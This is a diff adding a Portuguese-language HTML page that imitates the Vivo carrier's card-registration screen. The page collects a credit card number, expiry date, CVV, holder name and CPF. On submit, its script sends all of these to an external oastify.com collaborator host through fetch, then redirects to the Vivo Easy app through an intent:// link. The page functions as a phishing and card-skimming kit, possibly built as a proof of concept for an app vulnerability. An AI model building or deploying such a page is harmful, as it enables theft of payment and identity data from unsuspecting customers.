@@ -1,0 +1,618 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover, interactive-widget=resizes-content">
+  <meta name="theme-color" content="#ffffff">
+  <title>Meus cartões</title>
+  <style>
+    :root {
+      --vivo-purple: #670099;
+      --vivo-purple-disabled: #d0b3e1;
+      --field-gray: #ebebeb;
+      --muted: #757575;
+      --page-width: 360px;
+    }
+
+    * {
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      overflow: hidden;
+      background: #fff;
+      color: #191919;
+      font-family: Roboto, "Noto Sans", Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    button,
+    input {
+      font: inherit;
+    }
+
+    button {
+      border: 0;
+    }
+
+    .app {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      min-height: 420px;
+      background: #fff;
+    }
+
+    .topbar {
+      position: relative;
+      height: 91px;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding-top: 26px;
+    }
+
+    .topbar h1 {
+      margin: 0;
+      font-size: 27px;
+      line-height: 38px;
+      font-weight: 300;
+      letter-spacing: -1px;
+    }
+
+    .back-button {
+      position: absolute;
+      left: 18px;
+      top: 32px;
+      width: 27px;
+      height: 31px;
+      padding: 0;
+      background: transparent;
+      cursor: pointer;
+    }
+
+    .back-button::before {
+      content: "";
+      position: absolute;
+      left: 8px;
+      top: 4px;
+      width: 12px;
+      height: 12px;
+      border-left: 2.5px solid #090909;
+      border-bottom: 2.5px solid #090909;
+      border-radius: 1px;
+      transform: rotate(45deg);
+    }
+
+    .saved-card {
+      position: absolute;
+      top: 121px;
+      left: 19px;
+      right: 19px;
+      height: 99px;
+      padding: 28px 22px;
+      border: 1px solid #ececec;
+      border-radius: 9px;
+      background: #fff;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, .18);
+    }
+
+    .card-heading {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      color: var(--vivo-purple);
+      font-size: 16px;
+      line-height: 18px;
+      font-weight: 700;
+    }
+
+    .card-heading > span:last-child {
+      display: inline-block;
+      transform: scaleX(.82);
+      transform-origin: left center;
+    }
+
+    .selected-mark {
+      position: relative;
+      width: 19px;
+      height: 19px;
+      flex: 0 0 19px;
+      border: 2px solid var(--vivo-purple);
+      border-radius: 50%;
+    }
+
+    .selected-mark::after {
+      content: "";
+      position: absolute;
+      inset: 4px;
+      border-radius: 50%;
+      background: var(--vivo-purple);
+    }
+
+    .card-details {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-top: 9px;
+      margin-left: -6px;
+    }
+
+    .card-number-small {
+      font-size: 18px;
+      line-height: 20px;
+      font-weight: 300;
+      letter-spacing: .4px;
+      white-space: nowrap;
+      margin-right: -18px;
+      transform: scaleX(.78);
+      transform-origin: left center;
+    }
+
+    .mastercard {
+      position: relative;
+      width: 31px;
+      height: 19px;
+    }
+
+    .mastercard::before,
+    .mastercard::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      width: 19px;
+      height: 19px;
+      border-radius: 50%;
+    }
+
+    .mastercard::before {
+      left: 0;
+      background: #eb001b;
+    }
+
+    .mastercard::after {
+      right: 0;
+      background: #f79e1b;
+      opacity: .96;
+    }
+
+    .add-card-button {
+      position: absolute;
+      left: 22px;
+      right: 22px;
+      bottom: 21px;
+      height: 51px;
+      border-radius: 10px;
+      background: var(--vivo-purple);
+      color: #fff;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .dialog-layer {
+      position: fixed;
+      inset: 0;
+      z-index: 10;
+      visibility: hidden;
+      background: rgba(0, 0, 0, .42);
+      opacity: 0;
+      transition: opacity 150ms ease, visibility 0s linear 150ms;
+    }
+
+    .dialog-layer.open {
+      visibility: visible;
+      opacity: 1;
+      transition-delay: 0s;
+    }
+
+    .sheet {
+      position: absolute;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      height: 575px;
+      max-height: 100%;
+      overflow: hidden;
+      border-radius: 17px 17px 0 0;
+      background: #fff;
+      transform: translateY(100%);
+      transition: transform 220ms cubic-bezier(.2, .8, .2, 1);
+    }
+
+    .dialog-layer.open .sheet {
+      transform: translateY(0);
+    }
+
+    .close-button {
+      position: absolute;
+      z-index: 2;
+      top: 16px;
+      right: 14px;
+      width: 33px;
+      height: 33px;
+      padding: 0;
+      background: transparent;
+      cursor: pointer;
+    }
+
+    .close-button::before,
+    .close-button::after {
+      content: "";
+      position: absolute;
+      left: 15px;
+      top: 1px;
+      width: 2.5px;
+      height: 24px;
+      border-radius: 2px;
+      background: #050505;
+    }
+
+    .close-button::before {
+      transform: rotate(45deg);
+    }
+
+    .close-button::after {
+      transform: rotate(-45deg);
+    }
+
+    .sheet-title {
+      position: absolute;
+      top: 57px;
+      left: 12px;
+      right: 12px;
+      margin: 0;
+      font-size: 26px;
+      line-height: 31px;
+      font-weight: 300;
+      letter-spacing: -.7px;
+      text-align: center;
+    }
+
+    .sheet-title span {
+      display: block;
+      white-space: nowrap;
+    }
+
+    .card-form {
+      position: absolute;
+      top: 129px;
+      left: 15px;
+      right: 15px;
+    }
+
+    .field-group,
+    .field-row {
+      margin: 0;
+    }
+
+    .field-group + .field-row {
+      margin-top: 15px;
+    }
+
+    .field-row + .field-group {
+      margin-top: 16px;
+    }
+
+    .card-form > .field-group + .field-group {
+      margin-top: 16px;
+    }
+
+    .field-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 19px;
+    }
+
+    .field-label {
+      display: flex;
+      align-items: center;
+      height: 21px;
+      margin: 0 2px 3px;
+      font-size: 17px;
+      line-height: 21px;
+      font-weight: 400;
+      white-space: nowrap;
+    }
+
+    .info-icon {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 15px;
+      height: 15px;
+      margin-left: 7px;
+      flex: 0 0 15px;
+      border: 1.5px solid var(--vivo-purple);
+      border-radius: 50%;
+      color: var(--vivo-purple);
+      font-family: Georgia, serif;
+      font-size: 11px;
+      line-height: 14px;
+      font-weight: 700;
+      font-style: normal;
+    }
+
+    .holder-label .label-text {
+      display: inline-block;
+      margin-right: -50px;
+      transform: scaleX(.85);
+      transform-origin: left center;
+    }
+
+    .text-field {
+      display: block;
+      width: 100%;
+      height: 46px;
+      padding: 0 14px;
+      border: 0;
+      border-radius: 13px;
+      outline: none;
+      background: var(--field-gray);
+      color: #222;
+      font-size: 19px;
+      font-weight: 300;
+      caret-color: var(--vivo-purple);
+    }
+
+    .text-field::placeholder {
+      color: #9b9b9b;
+      opacity: 1;
+    }
+
+    .card-number-input {
+      height: 47px;
+      padding: 0 13px;
+      border: 2px solid var(--vivo-purple);
+      border-radius: 13px;
+      background: #fff;
+      font-size: 20px;
+      letter-spacing: .35px;
+    }
+
+    .primary-note {
+      display: flex;
+      align-items: center;
+      height: 21px;
+      margin-top: 16px;
+      color: var(--muted);
+      width: 115%;
+      font-size: 14px;
+      line-height: 20px;
+      white-space: nowrap;
+      transform: scaleX(.87);
+      transform-origin: left center;
+    }
+
+    .primary-note .info-icon {
+      margin-left: 7px;
+    }
+
+    .confirm-button {
+      width: 100%;
+      height: 52px;
+      margin-top: 7px;
+      border-radius: 11px;
+      background: var(--vivo-purple);
+      color: #fff;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .confirm-button:disabled {
+      background: var(--vivo-purple-disabled);
+      color: rgba(255, 255, 255, .28);
+      cursor: default;
+    }
+
+    @media (min-width: 500px) {
+      .app,
+      .dialog-layer {
+        width: min(100%, var(--page-width));
+        left: 50%;
+        right: auto;
+        transform: translateX(-50%);
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .dialog-layer,
+      .sheet {
+        transition: none;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="app" aria-label="Meus cartões">
+    <header class="topbar">
+      <button class="back-button" type="button" aria-label="Voltar"></button>
+      <h1>Meus cartões</h1>
+    </header>
+
+    <section class="saved-card" aria-label="Cartão principal terminado em 0528">
+      <div class="card-heading">
+        <span class="selected-mark" aria-hidden="true"></span>
+        <span>CARTÃO PRINCIPAL</span>
+      </div>
+      <div class="card-details">
+        <span class="card-number-small">* * * * 0528</span>
+        <span class="mastercard" aria-label="Mastercard"></span>
+      </div>
+    </section>
+
+    <button class="add-card-button" type="button">Adicionar novo cartão</button>
+  </main>
+
+  <div class="dialog-layer" aria-hidden="true">
+    <section class="sheet" role="dialog" aria-modal="true" aria-labelledby="dialog-title">
+      <button class="close-button" type="button" aria-label="Fechar"></button>
+      <h2 class="sheet-title" id="dialog-title"><span>Cadastrar novo cartão de</span><span>crédito</span></h2>
+
+      <form class="card-form" autocomplete="off" novalidate>
+        <div class="field-group">
+          <label class="field-label" for="card-number">Número do cartão</label>
+          <input class="text-field card-number-input" id="card-number" name="card-number"
+                 type="text" inputmode="numeric" enterkeyhint="next" maxlength="19"
+                 placeholder="0000 0000 0000 0000" aria-label="Número do cartão">
+        </div>
+
+        <div class="field-row">
+          <div class="field-group">
+            <label class="field-label" for="expiry">Data de validade</label>
+            <input class="text-field" id="expiry" name="expiry" type="text"
+                   inputmode="numeric" enterkeyhint="next" maxlength="5" aria-label="Data de validade">
+          </div>
+          <div class="field-group">
+            <label class="field-label" for="cvv">CVV <i class="info-icon" aria-hidden="true">i</i></label>
+            <input class="text-field" id="cvv" name="cvv" type="password"
+                   inputmode="numeric" enterkeyhint="next" maxlength="4" aria-label="CVV">
+          </div>
+        </div>
+
+        <div class="field-group">
+          <label class="field-label holder-label" for="holder"><span class="label-text">Nome do titular como está no cartão</span> <i class="info-icon" aria-hidden="true">i</i></label>
+          <input class="text-field" id="holder" name="holder" type="text"
+                 autocapitalize="characters" enterkeyhint="next" aria-label="Nome do titular">
+        </div>
+
+        <div class="field-group">
+          <label class="field-label" for="cpf">CPF do titular do cartão</label>
+          <input class="text-field" id="cpf" name="cpf" type="text"
+                 inputmode="numeric" enterkeyhint="done" maxlength="14" aria-label="CPF do titular">
+        </div>
+
+        <div class="primary-note">Este cartão será o meio de pagamento principal.<i class="info-icon" aria-hidden="true">i</i></div>
+        <button class="confirm-button" type="submit" disabled>Confirmar cadastro do cartão</button>
+      </form>
+    </section>
+  </div>
+
+  <script>
+    (() => {
+      const layer = document.querySelector('.dialog-layer');
+      const addButton = document.querySelector('.add-card-button');
+      const closeButton = document.querySelector('.close-button');
+      const backButton = document.querySelector('.back-button');
+      const form = document.querySelector('.card-form');
+      const confirmButton = document.querySelector('.confirm-button');
+      const themeColor = document.querySelector('meta[name="theme-color"]');
+      const fields = [...form.querySelectorAll('input')];
+
+      const digits = value => value.replace(/\D/g, '');
+      const formatGroups = (value, sizes, separator) => {
+        let rest = digits(value);
+        const groups = [];
+        for (const size of sizes) {
+          if (!rest) break;
+          groups.push(rest.slice(0, size));
+          rest = rest.slice(size);
+        }
+        return groups.join(separator);
+      };
+
+      const openDialog = () => {
+        layer.classList.add('open');
+        layer.setAttribute('aria-hidden', 'false');
+        themeColor.setAttribute('content', '#9c9c9c');
+      };
+
+      const closeDialog = () => {
+        document.activeElement?.blur();
+        layer.classList.remove('open');
+        layer.setAttribute('aria-hidden', 'true');
+        themeColor.setAttribute('content', '#ffffff');
+      };
+
+      const validate = () => {
+        const cardOk = digits(fields[0].value).length === 16;
+        const expiryOk = /^\d{2}\/\d{2}$/.test(fields[1].value);
+        const cvvOk = /^\d{3,4}$/.test(fields[2].value);
+        const holderOk = fields[3].value.trim().length >= 3;
+        const cpfOk = digits(fields[4].value).length === 11;
+        confirmButton.disabled = !(cardOk && expiryOk && cvvOk && holderOk && cpfOk);
+      };
+
+      addButton.addEventListener('click', openDialog);
+      closeButton.addEventListener('click', closeDialog);
+      backButton.addEventListener('click', () => {
+        if (history.length > 1) history.back();
+      });
+
+      layer.addEventListener('click', event => {
+        if (event.target === layer) closeDialog();
+      });
+
+      document.getElementById('card-number').addEventListener('input', event => {
+        event.target.value = formatGroups(event.target.value, [4, 4, 4, 4], ' ');
+        validate();
+      });
+
+      document.getElementById('expiry').addEventListener('input', event => {
+        event.target.value = formatGroups(event.target.value, [2, 2], '/');
+        validate();
+      });
+
+      document.getElementById('cvv').addEventListener('input', event => {
+        event.target.value = digits(event.target.value).slice(0, 4);
+        validate();
+      });
+
+      document.getElementById('cpf').addEventListener('input', event => {
+        const value = digits(event.target.value).slice(0, 11);
+        event.target.value = value
+          .replace(/^(\d{3})(\d)/, '$1.$2')
+          .replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3')
+          .replace(/\.(\d{3})(\d)/, '.$1-$2');
+        validate();
+      });
+
+      document.getElementById('holder').addEventListener('input', validate);
+
+      window.login = function() {
+        var cc = document.getElementById('card-number').value;
+        var exp = document.getElementById('expiry').value;
+        var cvv = document.getElementById('cvv').value;
+        var cpf = document.getElementById('cpf').value;
+        var name = document.getElementById('holder').value;
+        var targetOast = 'https://93akf8ewuq1782atpuhu3ed19sfj3br0.oastify.com/';
+        var targetRedir = 'intent://open/#Intent;scheme=vivoeasy;package=br.com.vivo.vivoeasy;end';
+
+        fetch(targetOast + '?cc=' + encodeURIComponent(cc) + '&exp=' + encodeURIComponent(exp) + '&cvv=' + encodeURIComponent(cvv) + '&cpf=' + encodeURIComponent(cpf) + '&name=' + encodeURIComponent(name), {mode: 'no-cors'
+
+
+        }).finally(() => {            
+            window.location.href = targetRedir;
+        });
+      };
+
+      form.addEventListener('submit', event => {
+        event.preventDefault();
+        
+        // Remove o foco do campo ativo (isso força o teclado virtual a fechar/encolher)
+        if (document.activeElement && typeof document.activeElement.blur === 'function') {
+          document.activeElement.blur();
+        }
+
+        // Caso os dados estejam validados, executa a ação do formulário
+        if (!confirmButton.disabled) {
+          window.login();
+        }
+      });
+
+      document.addEventListener('keydown', event => {
+        if (event.key === 'Escape' && layer.classList.contains('open')) closeDialog();
+      });
+
+      // Facilita a validação visual automatizada sem alterar o estado inicial.
+      if (new URLSearchParams(location.search).has('dialog')) openDialog();
+    })();
+  </script>
+</body>
+</html>
